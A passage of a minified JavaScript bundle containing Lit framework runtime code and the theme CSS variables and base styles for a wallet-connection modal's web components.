0)e=Ui(this,e,n,0),a=!na(e)||e!==this._$AH&&e!==Gr,a&&(this._$AH=e);else{const s=e;let c,l;for(e=i[0],c=0;c<i.length-1;c++)l=Ui(this,s[r+c],n,c),l===Gr&&(l=this._$AH[c]),a||(a=!na(l)||l!==this._$AH[c]),l===rt?e=rt:e!==rt&&(e+=(l??"")+i[c+1]),this._$AH[c]=l}a&&!o&&this.O(e)}O(e){e===rt?this.element.removeAttribute(this.name):this.element.setAttribute(this.name,e??"")}}let ty=class extends Pc{constructor(){super(...arguments),this.type=3}O(e){this.element[this.name]=e===rt?void 0:e}},ny=class extends Pc{constructor(){super(...arguments),this.type=4}O(e){this.element.toggleAttribute(this.name,!!e&&e!==rt)}};class ry extends Pc{constructor(e,n,r,o,i){super(e,n,r,o,i),this.type=5}_$AI(e,n=this){if((e=Ui(this,e,n,0)??rt)===Gr)return;const r=this._$AH,o=e===rt&&r!==rt||e.capture!==r.capture||e.once!==r.once||e.passive!==r.passive,i=e!==rt&&(r===rt||o);o&&this.element.removeEventListener(this.name,this,r),i&&this.element.addEventListener(this.name,this,e),this._$AH=e}handleEvent(e){var n;typeof this._$AH=="function"?this._$AH.call(((n=this.options)==null?void 0:n.host)??this.element,e):this._$AH.handleEvent(e)}}let iy=class{constructor(e,n,r){this.element=e,this.type=6,this._$AN=void 0,this._$AM=n,this.options=r}get _$AU(){return this._$AM._$AU}_$AI(e){Ui(this,e)}};const El=$o.litHtmlPolyfillSupport;El==null||El(pu,Fa),($o.litHtmlVersions??($o.litHtmlVersions=[])).push("3.1.1");const oy=(t,e,n)=>{const r=(n==null?void 0:n.renderBefore)??e;let o=r._$litPart$;if(o===void 0){const i=(n==null?void 0:n.renderBefore)??null;r._$litPart$=o=new Fa(e.insertBefore(ta(),i),i,void 0,n??{})}return o._$AI(t),o};/**
 * @license
 * Copyright 2017 Google LLC
 * SPDX-License-Identifier: BSD-3-Clause
 */let H=class extends Ei{constructor(){super(...arguments),this.renderOptions={host:this},this._$Do=void 0}createRenderRoot(){var n;const e=super.createRenderRoot();return(n=this.renderOptions).renderBefore??(n.renderBefore=e.firstChild),e}update(e){const n=this.render();this.hasUpdated||(this.renderOptions.isConnected=this.isConnected),super.update(e),this._$Do=oy(n,this.renderRoot,this.renderOptions)}connectedCallback(){var e;super.connectedCallback(),(e=this._$Do)==null||e.setConnected(!0)}disconnectedCallback(){var e;super.disconnectedCallback(),(e=this._$Do)==null||e.setConnected(!1)}render(){return Gr}};var sh;H._$litElement$=!0,H.finalized=!0,(sh=globalThis.litElementHydrateSupport)==null||sh.call(globalThis,{LitElement:H});const Cl=globalThis.litElementPolyfillSupport;Cl==null||Cl({LitElement:H});(globalThis.litElementVersions??(globalThis.litElementVersions=[])).push("4.0.3");let Oo,sr,cr;function Ap(t,e){Oo=document.createElement("style"),sr=document.createElement("style"),cr=document.createElement("style"),Oo.textContent=Pi(t).core.cssText,sr.textContent=Pi(t).dark.cssText,cr.textContent=Pi(t).light.cssText,document.head.appendChild(Oo),document.head.appendChild(sr),document.head.appendChild(cr),Rd(e)}function Rd(t){sr&&cr&&(t==="light"?(sr.removeAttribute("media"),cr.media="enabled"):(cr.removeAttribute("media"),sr.media="enabled"))}function Tp(t){Oo&&sr&&cr&&(Oo.textContent=Pi(t).core.cssText,sr.textContent=Pi(t).dark.cssText,cr.textContent=Pi(t).light.cssText)}function Pi(t){return{core:q`
      @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
      :root {
        --w3m-color-mix-strength: ${yn(t!=null&&t["--w3m-color-mix-strength"]?`${t["--w3m-color-mix-strength"]}%`:"0%")};
        --w3m-font-family: ${yn((t==null?void 0:t["--w3m-font-family"])||"Inter, Segoe UI, Roboto, Oxygen, Ubuntu, Cantarell, Fira Sans, Droid Sans, Helvetica Neue, sans-serif;")};
        --w3m-font-size-master: ${yn((t==null?void 0:t["--w3m-font-size-master"])||"10px")};
        --w3m-border-radius-master: ${yn((t==null?void 0:t["--w3m-border-radius-master"])||"4px")};
        --w3m-z-index: ${yn((t==null?void 0:t["--w3m-z-index"])||100)};

        --wui-font-family: var(--w3m-font-family);

        --wui-font-size-micro: var(--w3m-font-size-master);
        --wui-font-size-tiny: calc(var(--w3m-font-size-master) * 1.2);
        --wui-font-size-small: calc(var(--w3m-font-size-master) * 1.4);
        --wui-font-size-paragraph: calc(var(--w3m-font-size-master) * 1.6);
        --wui-font-size-large: calc(var(--w3m-font-size-master) * 2);

        --wui-border-radius-5xs: var(--w3m-border-radius-master);
        --wui-border-radius-4xs: calc(var(--w3m-border-radius-master) * 1.5);
        --wui-border-radius-3xs: calc(var(--w3m-border-radius-master) * 2);
        --wui-border-radius-xxs: calc(var(--w3m-border-radius-master) * 3);
        --wui-border-radius-xs: calc(var(--w3m-border-radius-master) * 4);
        --wui-border-radius-s: calc(var(--w3m-border-radius-master) * 5);
        --wui-border-radius-m: calc(var(--w3m-border-radius-master) * 7);
        --wui-border-radius-l: calc(var(--w3m-border-radius-master) * 9);
        --wui-border-radius-3xl: calc(var(--w3m-border-radius-master) * 20);

        --wui-font-weight-light: 400;
        --wui-font-weight-regular: 500;
        --wui-font-weight-medium: 600;
        --wui-font-weight-bold: 700;

        --wui-letter-spacing-large: -0.8px;
        --wui-letter-spacing-paragraph: -0.64px;
        --wui-letter-spacing-small: -0.56px;
        --wui-letter-spacing-tiny: -0.48px;
        --wui-letter-spacing-micro: -0.2px;

        --wui-spacing-0: 0px;
        --wui-spacing-4xs: 2px;
        --wui-spacing-3xs: 4px;
        --wui-spacing-xxs: 6px;
        --wui-spacing-2xs: 7px;
        --wui-spacing-xs: 8px;
        --wui-spacing-1xs: 10px;
        --wui-spacing-s: 12px;
        --wui-spacing-m: 14px;
        --wui-spacing-l: 16px;
        --wui-spacing-2l: 18px;
        --wui-spacing-xl: 20px;
        --wui-spacing-xxl: 24px;
        --wui-spacing-2xl: 32px;
        --wui-spacing-3xl: 40px;
        --wui-spacing-4xl: 90px;

        --wui-icon-box-size-xxs: 14px;
        --wui-icon-box-size-xs: 20px;
        --wui-icon-box-size-sm: 24px;
        --wui-icon-box-size-md: 32px;
        --wui-icon-box-size-lg: 40px;
        --wui-icon-box-size-xl: 64px;

        --wui-icon-size-inherit: inherit;
        --wui-icon-size-xxs: 10px;
        --wui-icon-size-xs: 12px;
        --wui-icon-size-sm: 14px;
        --wui-icon-size-md: 16px;
        --wui-icon-size-mdl: 18px;
        --wui-icon-size-lg: 20px;
        --wui-icon-size-xl: 24px;

        --wui-wallet-image-size-inherit: inherit;
        --wui-wallet-image-size-sm: 40px;
        --wui-wallet-image-size-md: 56px;
        --wui-wallet-image-size-lg: 80px;

        --wui-box-size-md: 100px;
        --wui-box-size-lg: 120px;

        --wui-ease-out-power-2: cubic-bezier(0, 0, 0.22, 1);
        --wui-ease-out-power-1: cubic-bezier(0, 0, 0.55, 1);

        --wui-ease-in-power-3: cubic-bezier(0.66, 0, 1, 1);
        --wui-ease-in-power-2: cubic-bezier(0.45, 0, 1, 1);
        --wui-ease-in-power-1: cubic-bezier(0.3, 0, 1, 1);

        --wui-ease-inout-power-1: cubic-bezier(0.45, 0, 0.55, 1);

        --wui-duration-lg: 200ms;
        --wui-duration-md: 125ms;
        --wui-duration-sm: 75ms;

        --wui-path-network: path(
          'M43.4605 10.7248L28.0485 1.61089C25.5438 0.129705 22.4562 0.129705 19.9515 1.61088L4.53951 10.7248C2.03626 12.2051 0.5 14.9365 0.5 17.886V36.1139C0.5 39.0635 2.03626 41.7949 4.53951 43.2752L19.9515 52.3891C22.4562 53.8703 25.5438 53.8703 28.0485 52.3891L43.4605 43.2752C45.9637 41.7949 47.5 39.0635 47.5 36.114V17.8861C47.5 14.9365 45.9637 12.2051 43.4605 10.7248Z'
        );

        --wui-path-network-lg: path(
          'M78.3244 18.926L50.1808 2.45078C45.7376 -0.150261 40.2624 -0.150262 35.8192 2.45078L7.6756 18.926C3.23322 21.5266 0.5 26.3301 0.5 31.5248V64.4752C0.5 69.6699 3.23322 74.4734 7.6756 77.074L35.8192 93.5492C40.2624 96.1503 45.7376 96.1503 50.1808 93.5492L78.3244 77.074C82.7668 74.4734 85.5 69.6699 85.5 64.4752V31.5248C85.5 26.3301 82.7668 21.5266 78.3244 18.926Z'
        );

        --wui-color-inherit: inherit;

        --wui-color-inverse-100: #fff;
        --wui-color-inverse-000: #000;

        --wui-cover: rgba(20, 20, 20, 0.8);

        --wui-color-modal-bg: var(--wui-color-modal-bg-base);

        --wui-color-blue-100: var(--wui-color-blue-base-100);

        --wui-color-accent-100: var(--wui-color-accent-base-100);
        --wui-color-accent-090: var(--wui-color-accent-base-090);
        --wui-color-accent-080: var(--wui-color-accent-base-080);

        --wui-accent-glass-090: var(--wui-accent-glass-base-090);
        --wui-accent-glass-080: var(--wui-accent-glass-base-080);
        --wui-accent-glass-020: var(--wui-accent-glass-base-020);
        --wui-accent-glass-015: var(--wui-accent-glass-base-015);
        --wui-accent-glass-010: var(--wui-accent-glass-base-010);
        --wui-accent-glass-005: var(--wui-accent-glass-base-005);
        --wui-accent-glass-002: var(--wui-accent-glass-base-002);

        --wui-color-fg-100: var(--wui-color-fg-base-100);
        --wui-color-fg-125: var(--wui-color-fg-base-125);
        --wui-color-fg-150: var(--wui-color-fg-base-150);
        --wui-color-fg-175: var(--wui-color-fg-base-175);
        --wui-color-fg-200: var(--wui-color-fg-base-200);
        --wui-color-fg-225: var(--wui-color-fg-base-225);
        --wui-color-fg-250: var(--wui-color-fg-base-250);
        --wui-color-fg-275: var(--wui-color-fg-base-275);
        --wui-color-fg-300: var(--wui-color-fg-base-300);

        --wui-color-bg-100: var(--wui-color-bg-base-100);
        --wui-color-bg-125: var(--wui-color-bg-base-125);
        --wui-color-bg-150: var(--wui-color-bg-base-150);
        --wui-color-bg-175: var(--wui-color-bg-base-175);
        --wui-color-bg-200: var(--wui-color-bg-base-200);
        --wui-color-bg-225: var(--wui-color-bg-base-225);
        --wui-color-bg-250: var(--wui-color-bg-base-250);
        --wui-color-bg-275: var(--wui-color-bg-base-275);
        --wui-color-bg-300: var(--wui-color-bg-base-300);

        --wui-color-success-100: var(--wui-color-success-base-100);
        --wui-color-error-100: var(--wui-color-error-base-100);

        --wui-icon-box-bg-error-100: var(--wui-icon-box-bg-error-base-100);
        --wui-icon-box-bg-blue-100: var(--wui-icon-box-bg-blue-base-100);
        --wui-icon-box-bg-success-100: var(--wui-icon-box-bg-success-base-100);
        --wui-icon-box-bg-inverse-100: var(--wui-icon-box-bg-inverse-base-100);

        --wui-all-wallets-bg-100: var(--wui-all-wallets-bg-base-100);

        --wui-avatar-border: var(--wui-avatar-border-base);

        --wui-thumbnail-border: var(--wui-thumbnail-border-base);

        --wui-box-shadow-blue: rgba(71, 161, 255, 0.16);
      }

      @supports (background: color-mix(in srgb, white 50%, black)) {
        :root {
          --wui-color-modal-bg: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-modal-bg-base)
          );

          --wui-box-shadow-blue: color-mix(in srgb, var(--wui-color-accent-100) 16%, transparent);

          --wui-color-accent-090: color-mix(
            in srgb,
            var(--wui-color-accent-base-100) 90%,
            var(--w3m-default)
          );
          --wui-color-accent-080: color-mix(
            in srgb,
            var(--wui-color-accent-base-100) 80%,
            var(--w3m-default)
          );

          --wui-color-accent-090: color-mix(
            in srgb,
            var(--wui-color-accent-base-100) 90%,
            transparent
          );
          --wui-color-accent-080: color-mix(
            in srgb,
            var(--wui-color-accent-base-100) 80%,
            transparent
          );

          --wui-accent-glass-090: color-mix(
            in srgb,
            var(--wui-color-accent-base-100) 90%,
            transparent
          );
          --wui-accent-glass-080: color-mix(
            in srgb,
            var(--wui-color-accent-base-100) 80%,
            transparent
          );
          --wui-accent-glass-020: color-mix(
            in srgb,
            var(--wui-color-accent-base-100) 20%,
            transparent
          );
          --wui-accent-glass-015: color-mix(
            in srgb,
            var(--wui-color-accent-base-100) 15%,
            transparent
          );
          --wui-accent-glass-010: color-mix(
            in srgb,
            var(--wui-color-accent-base-100) 10%,
            transparent
          );
          --wui-accent-glass-005: color-mix(
            in srgb,
            var(--wui-color-accent-base-100) 5%,
            transparent
          );
          --wui-color-accent-002: color-mix(
            in srgb,
            var(--wui-color-accent-base-100) 2%,
            transparent
          );

          --wui-color-fg-100: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-fg-base-100)
          );
          --wui-color-fg-125: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-fg-base-125)
          );
          --wui-color-fg-150: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-fg-base-150)
          );
          --wui-color-fg-175: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-fg-base-175)
          );
          --wui-color-fg-200: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-fg-base-200)
          );
          --wui-color-fg-225: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-fg-base-225)
          );
          --wui-color-fg-250: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-fg-base-250)
          );
          --wui-color-fg-275: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-fg-base-275)
          );
          --wui-color-fg-300: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-fg-base-300)
          );

          --wui-color-bg-100: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-bg-base-100)
          );
          --wui-color-bg-125: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-bg-base-125)
          );
          --wui-color-bg-150: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-bg-base-150)
          );
          --wui-color-bg-175: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-bg-base-175)
          );
          --wui-color-bg-200: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-bg-base-200)
          );
          --wui-color-bg-225: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-bg-base-225)
          );
          --wui-color-bg-250: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-bg-base-250)
          );
          --wui-color-bg-275: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-bg-base-275)
          );
          --wui-color-bg-300: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-bg-base-300)
          );

          --wui-color-success-100: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-success-base-100)
          );
          --wui-color-error-100: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-error-base-100)
          );

          --wui-icon-box-bg-error-100: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-icon-box-bg-error-base-100)
          );
          --wui-icon-box-bg-accent-100: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-icon-box-bg-blue-base-100)
          );
          --wui-icon-box-bg-success-100: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-icon-box-bg-success-base-100)
          );
          --wui-icon-box-bg-inverse-100: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-icon-box-bg-inverse-base-100)
          );

          --wui-all-wallets-bg-100: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-all-wallets-bg-base-100)
          );

          --wui-avatar-border: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-avatar-border-base)
          );

          --wui-thumbnail-border: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-thumbnail-border-base)
          );
        }
      }
    `,light:q`
      :root {
        --w3m-color-mix: ${yn((t==null?void 0:t["--w3m-color-mix"])||"#fff")};
        --w3m-accent: ${yn((t==null?void 0:t["--w3m-accent"])||"#47a1ff")};
        --w3m-default: #fff;

        --wui-color-modal-bg-base: #191a1a;

        --wui-color-blue-base-100: #47a1ff;

        --wui-color-accent-base-100: var(--w3m-accent);
        --wui-color-accent-base-090: #59aaff;
        --wui-color-accent-base-080: #6cb4ff;

        --wui-accent-glass-base-090: rgba(71, 161, 255, 0.9);
        --wui-accent-glass-base-080: rgba(71, 161, 255, 0.8);
        --wui-accent-glass-base-020: rgba(71, 161, 255, 0.2);
        --wui-accent-glass-base-015: rgba(71, 161, 255, 0.15);
        --wui-accent-glass-base-010: rgba(71, 161, 255, 0.1);
        --wui-accent-glass-base-005: rgba(71, 161, 255, 0.05);
        --wui-accent-glass-base-002: rgba(71, 161, 255, 0.02);

        --wui-color-fg-base-100: #e4e7e7;
        --wui-color-fg-base-125: #d0d5d5;
        --wui-color-fg-base-150: #a8b1b1;
        --wui-color-fg-base-175: #a8b0b0;
        --wui-color-fg-base-200: #949e9e;
        --wui-color-fg-base-225: #868f8f;
        --wui-color-fg-base-250: #788080;
        --wui-color-fg-base-275: #788181;
        --wui-color-fg-base-300: #6e7777;

        --wui-color-bg-base-100: #141414;
        --wui-color-bg-base-125: #191a1a;
        --wui-color-bg-base-150: #1e1f1f;
        --wui-color-bg-base-175: #222525;
        --wui-color-bg-base-200: #272a2a;
        --wui-color-bg-base-225: #2c3030;
        --wui-color-bg-base-250: #313535;
        --wui-color-bg-base-275: #363b3b;
        --wui-color-bg-base-300: #3b4040;

        --wui-color-success-base-100: #26d962;
        --wui-color-error-base-100: #f25a67;

        --wui-success-glass-001: rgba(38, 217, 98, 0.01);
        --wui-success-glass-002: rgba(38, 217, 98, 0.02);
        --wui-success-glass-005: rgba(38, 217, 98, 0.05);
        --wui-success-glass-010: rgba(38, 217, 98, 0.1);
        --wui-success-glass-015: rgba(38, 217, 98, 0.15);
        --wui-success-glass-020: rgba(38, 217, 98, 0.2);
        --wui-success-glass-025: rgba(38, 217, 98, 0.25);
        --wui-success-glass-030: rgba(38, 217, 98, 0.3);
        --wui-success-glass-060: rgba(38, 217, 98, 0.6);
        --wui-success-glass-080: rgba(38, 217, 98, 0.8);

        --wui-icon-box-bg-error-base-100: #3c2426;
        --wui-icon-box-bg-blue-base-100: #20303f;
        --wui-icon-box-bg-success-base-100: #1f3a28;
        --wui-icon-box-bg-inverse-base-100: #243240;

        --wui-all-wallets-bg-base-100: #222b35;

        --wui-avatar-border-base: #252525;

        --wui-thumbnail-border-base: #252525;

        --wui-gray-glass-001: rgba(255, 255, 255, 0.01);
        --wui-gray-glass-002: rgba(255, 255, 255, 0.02);
        --wui-gray-glass-005: rgba(255, 255, 255, 0.05);
        --wui-gray-glass-010: rgba(255, 255, 255, 0.1);
        --wui-gray-glass-015: rgba(255, 255, 255, 0.15);
        --wui-gray-glass-020: rgba(255, 255, 255, 0.2);
        --wui-gray-glass-025: rgba(255, 255, 255, 0.25);
        --wui-gray-glass-030: rgba(255, 255, 255, 0.3);
        --wui-gray-glass-060: rgba(255, 255, 255, 0.6);
        --wui-gray-glass-080: rgba(255, 255, 255, 0.8);
      }
    `,dark:q`
      :root {
        --w3m-color-mix: ${yn((t==null?void 0:t["--w3m-color-mix"])||"#000")};
        --w3m-accent: ${yn((t==null?void 0:t["--w3m-accent"])||"#3396ff")};
        --w3m-default: #000;

        --wui-color-modal-bg-base: #fff;

        --wui-color-blue-base-100: #3396ff;

        --wui-color-accent-base-100: var(--w3m-accent);
        --wui-color-accent-base-090: #2d7dd2;
        --wui-color-accent-base-080: #2978cc;

        --wui-accent-glass-base-090: rgba(51, 150, 255, 0.9);
        --wui-accent-glass-base-080: rgba(51, 150, 255, 0.8);
        --wui-accent-glass-base-020: rgba(51, 150, 255, 0.2);
        --wui-accent-glass-base-015: rgba(51, 150, 255, 0.15);
        --wui-accent-glass-base-010: rgba(51, 150, 255, 0.1);
        --wui-accent-glass-base-005: rgba(51, 150, 255, 0.05);
        --wui-accent-glass-base-002: rgba(51, 150, 255, 0.02);

        --wui-color-fg-base-100: #141414;
        --wui-color-fg-base-125: #2d3131;
        --wui-color-fg-base-150: #474d4d;
        --wui-color-fg-base-175: #636d6d;
        --wui-color-fg-base-200: #798686;
        --wui-color-fg-base-225: #828f8f;
        --wui-color-fg-base-250: #8b9797;
        --wui-color-fg-base-275: #95a0a0;
        --wui-color-fg-base-300: #9ea9a9;

        --wui-color-bg-base-100: #ffffff;
        --wui-color-bg-base-125: #f5fafa;
        --wui-color-bg-base-150: #f3f8f8;
        --wui-color-bg-base-175: #eef4f4;
        --wui-color-bg-base-200: #eaf1f1;
        --wui-color-bg-base-225: #e5eded;
        --wui-color-bg-base-250: #e1e9e9;
        --wui-color-bg-base-275: #dce7e7;
        --wui-color-bg-base-300: #d8e3e3;

        --wui-color-success-base-100: #26b562;
        --wui-color-error-base-100: #f05142;

        --wui-success-glass-001: rgba(38, 181, 98, 0.01);
        --wui-success-glass-002: rgba(38, 181, 98, 0.02);
        --wui-success-glass-005: rgba(38, 181, 98, 0.05);
        --wui-success-glass-010: rgba(38, 181, 98, 0.1);
        --wui-success-glass-015: rgba(38, 181, 98, 0.15);
        --wui-success-glass-020: rgba(38, 181, 98, 0.2);
        --wui-success-glass-025: rgba(38, 181, 98, 0.25);
        --wui-success-glass-030: rgba(38, 181, 98, 0.3);
        --wui-success-glass-060: rgba(38, 181, 98, 0.6);
        --wui-success-glass-080: rgba(38, 181, 98, 0.8);

        --wui-icon-box-bg-error-base-100: #f4dfdd;
        --wui-icon-box-bg-blue-base-100: #d9ecfb;
        --wui-icon-box-bg-success-base-100: #daf0e4;
        --wui-icon-box-bg-inverse-base-100: #dcecfc;

        --wui-all-wallets-bg-base-100: #e8f1fa;

        --wui-avatar-border-base: #f3f4f4;

        --wui-thumbnail-border-base: #eaefef;

        --wui-gray-glass-001: rgba(0, 0, 0, 0.01);
        --wui-gray-glass-002: rgba(0, 0, 0, 0.02);
        --wui-gray-glass-005: rgba(0, 0, 0, 0.05);
        --wui-gray-glass-010: rgba(0, 0, 0, 0.1);
        --wui-gray-glass-015: rgba(0, 0, 0, 0.15);
        --wui-gray-glass-020: rgba(0, 0, 0, 0.2);
        --wui-gray-glass-025: rgba(0, 0, 0, 0.25);
        --wui-gray-glass-030: rgba(0, 0, 0, 0.3);
        --wui-gray-glass-060: rgba(0, 0, 0, 0.6);
        --wui-gray-glass-080: rgba(0, 0, 0, 0.8);
      }
    `}}const pe=q`
  *,
  *::after,
  *::before,
  :host {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-style: normal;
    text-rendering: optimizeSpeed;
    -webkit-font-smoothing: antialiased;
    -moz-osx-font-smoothing: grayscale;
    -webkit-tap-highlight-color: transparent;
    font-family: var(--wui-font-family);
    backface-visibility: hidden;
  }
`,Ye=q`
  button,
  a {
    cursor: pointer;
    display: flex;
    justify-content: center;
    align-items: center;
    position: relative;
    transition: all var(--wui-ease-out-power-1) var(--wui-duration-lg);
    outline: none;
    border: 1px solid transparent;
    column-gap: var(--wui-spacing-3xs);
    background-color: transparent;
    text-decoration: none;
  }

  @media (hover: hover) and (pointer: fine) {
    button:hover:enabled {
      background-color: var(--wui-gray-glass-005);
    }

    button:active:enabled {
      transition: all var(--wui-ease-out-power-2) var(--wui-duration-sm);
      background-color: var(--wui-gray-glass-010);
    }

    button[data-variant='fill']:hover:enabled {
      background-color: var(--wui-color-accent-090);
    }

    button[data-variant='accentBg']:hover:enabled {
      background: var(--wui-accent-glass-015);
    }

    button[data-variant='accentBg']:active:enabled {
      background: var(--wui-accent-glass-020);
    }
  }

  button:disabled {
    cursor: not-allowed;
    background-color: var(--wui-gray-glass-005);
  }

  button[data-variant='shade']:disabled,
  button[data-variant='accent']:disabled,
  button[data-variant='accentBg']:disabled {
    background-color: var(--wui-gray-glass-010);
    color: var(--wui-gray-glass-015);
    filter: grayscale(1);
  }

  button:disabled > wui-wallet-image,
  button:disabled > wui-all-wallets-image,
  button:disabled > wui-network-image,
  button:disabled > wui-image,
  button:disabled > wui-icon-box,
  button:disabled > wui-transaction-visual,
  button:disabled > wui-logo {
    filter: grayscale(1);
  }

  button:focus-visible,
  a:focus-visible {
    border: 1px solid var(--wui-color-accent-100);
    background-color: var(--wui-gray-glass-005);
    -webkit-box-shadow: 0px 0px 0px 4px var(--wui-box-shadow-blue);
    -moz-box-shadow: 0px 0px 0px 4px var(--wui-box-shadow-blue);
    box-shadow: 0px 0px 0px 4px var(--wui-box-shadow-blue);
  }

  button[data-variant='fill']:focus-visible {
    background-color: var(--wui-color-accent-090);
  }

  button[data-variant='fill'] {
    color: var(--wui-color-inverse-100);
    background-color: var(--wui-color-accent-100);
  }

  button[data-variant='fill']:disabled {
    color: var(--wui-gray-glass-015);
    background-color: var(--wui-gray-glass-015);
  }

  button[data-variant='fill']:disabled > wui-icon {
    color: var(--wui-gray-glass-015);
  }

  button[data-variant='shade'] {
    color: var(--wui-color-fg-200);
  }

  button[data-variant='accent'],
  button[data-variant='accentBg'] {
    color: var(--wui-color-accent-100);
  }

  button[data-variant='accentBg'] {
    background: var(--wui-accent-glass-010);
    border: 1px solid var(--wui-accent-glass-010);
  }

  button[data-variant='fullWidth'] {
    width: 100%;
    border-radius: var(--wui-border-radius-xs);
    height: 56px;
    border: none;
    background-color: var(--wui-gray-glass-002);
    color: var(--wui-color-fg-200);
    gap: var(--wui-spacing-xs);
  }

  button:active:enabled {
    background-color: var(--wui-gray-glass-010);
  }

  button[data-variant='fill']:active:enabled {
    background-color: var(--wui-color-accent-080);
    border: 1px solid var(--wui-gray-glass-010);
  }

  input {
    border: none;
    outline: none;
    appearance: none;
  }
`,Nd=q`
  .wui-color-inherit {
    color: var(--wui-color-inherit);
  }

  .wui-color-accent-100 {
    color: var(--wui-color-accent-100);
  }

  .wui-color-error-100 {
    color: var(--wui-color-error-100);
  }

  .wui-color-success-100 {
    color: var(--wui-color-success-100);
  }

  .wui-color-inverse-100 {
    color: var(--wui-color-inverse-100);
  }

  .wui-color-inverse-000 {
    color: var(--wui-color-inverse-000);
  }

  .wui-color-fg-100 {
    color: var(--wui-color-fg-100);
  }

  .wui-color-fg-200 {
    color: var(--wui-color-fg-200);
  }

  .wui-color-fg-300 {
    color: var(--wui-color-fg-300);
  }

  .wui-bg-color-inherit {
    background-color: var(--wui-color-inherit);
  }

  .wui-bg-color-blue-100 {
    background-color: var(--wui-color-accent-100);
  }

  .wui-bg-color-error-100 {
    background-color: var(--wui-color-error-100);
  }

  .wui-bg-color-success-100 {
    background-color: var(--wui-color-success-100);
  }

  .wui-bg-color-inverse-100 {
    background-color: var(--wui-color-inverse-100);
  }

  .wui-bg-color-inverse-000 {
    background-color: var(--wui-color-inverse-000);
  }

  .wui-bg-color-fg-100 {
    background-color: var(--wui-color-fg-100);
  }

  .wui-bg-color-fg-200 {
    background-color: var(--wui-color-fg-200);
  }

  .wui-bg-color-fg-300 {
    background-color: var(--wui-color-fg-300);
  }
`;function ay(t,e){const{kind:n,elements:r}=e;return{kind:n,elements:r,finisher(o){customElements.get(t)||customElements.define(t,o)}}}function sy(t,e){return customElements.get(t)||customElements.define(t,e),e}function z(t){return function(n){return typeof n=="function"?sy(t,n):ay(t,n)}}const cy=q`
  :host {
    display: block;
    border-radius: clamp(0px, var(--wui-border-radius-l), 44px);
    border: 1px solid var(--wui-gray-glass-005);
    background-color: var(--wui-color-modal-bg);
    overflow: hidden;
  }
`;var ly=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let Ns=class extends H{render(){return $`<slot></slot>`}};Ns.styles=[pe,cy];Ns=ly([z("wui-card")],Ns);/**
 * @license
 * Copyright 2017 Google LLC
 * SPDX-License-Identifier: BSD-3-Clause
 */const uy={attribute:!0,type:String,converter:Ds,reflect:!1,hasChanged:Dd},dy=(t=uy,e,n)=>{const{kind:r,metadata:o}=n;let i=globalThis.litPropertyMetadata.get(o);if(i===void 0&&globalThis.litPropertyMetadata.set(o,i=new Map),i.set(n.name,t),r==="accessor"){const{name:a}=n;return{set(s){const c=e.get.call(this);e.set.call(this,s),this.requestUpdate(a,c,t)},init(s){return s!==void 0&&this.C(a,void 0,t),s}}}if(r==="setter"){const{name:a}=n;return function(s){const c=this[a];e.call(this,s),this.requestUpdate(a,c,t)}}throw Error("Unsupported decorator location: "+r)};function O(t){return(e,n)=>typeof n=="object"?dy(t,e,n):((r,o,i)=>{const a=o.hasOwnProperty(i);return o.constructor.createProperty(i,a?{...r,wrapped:!0}:r),a?Object.getOwnPropertyDescriptor(o,i):void 0})(t,e,n)}/**
 * @license
 * Copyright 2017 Google LLC
 * SPDX-License-Identifier: BSD-3-Clause
 */function ee(t){return O({...t,state:!0,attribute:!1})}const fy=q`
  :host {
    display: flex;
    aspect-ratio: 1 / 1;
    color: var(--local-color);
